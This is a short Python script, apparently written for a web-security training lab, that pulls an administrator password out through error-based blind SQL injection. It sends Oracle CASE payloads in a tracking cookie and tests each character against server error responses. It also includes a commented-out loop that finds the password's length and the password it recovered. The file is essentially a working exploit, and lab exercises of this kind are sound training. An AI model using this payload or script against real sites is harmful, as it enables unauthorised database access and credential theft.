import requests as rq
import string

url = "https://0a3f0090044e5127c0074ed6003e00c9.web-security-academy.net/"
#headers = {"Cookie":"TrackingId=wk7Rrg7QmZ4YeEj1' AND (SELECT CASE WHEN (LENGTH(password) > 1) THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator')='a"}

leacked_data = list()

for _ in range(20):
	for ch in string.printable:
		position = len(leacked_data) + 1
		headers = headers = {"Cookie":f"TrackingId=wk7Rrg7QmZ4YeEj1' AND (SELECT CASE WHEN SUBSTR(password,{position},1)='{ch}' THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator')='a"}

		response = rq.get(url, headers=headers)
	
		if "Internal Server Error" in response.text:
			leacked_data.append(ch)
			break
		print("".join(leacked_data) + ch)

print("Password found: "+"".join(leacked_data))

# Get length of the password
# while True:
# 	for i in range(1000):
# 		headers = headers = {"Cookie":f"TrackingId=wk7Rrg7QmZ4YeEj1' AND (SELECT CASE WHEN LENGTH(password)={i} THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator')='a"}

# 		response = rq.get(url, headers=headers)
	
# 		if "Internal Server Error" in response.text:
# 			print(i)
# 			break
# 		print("Trying : " + str(i))

#Password : jgzccbkcfyzvh6by4l0c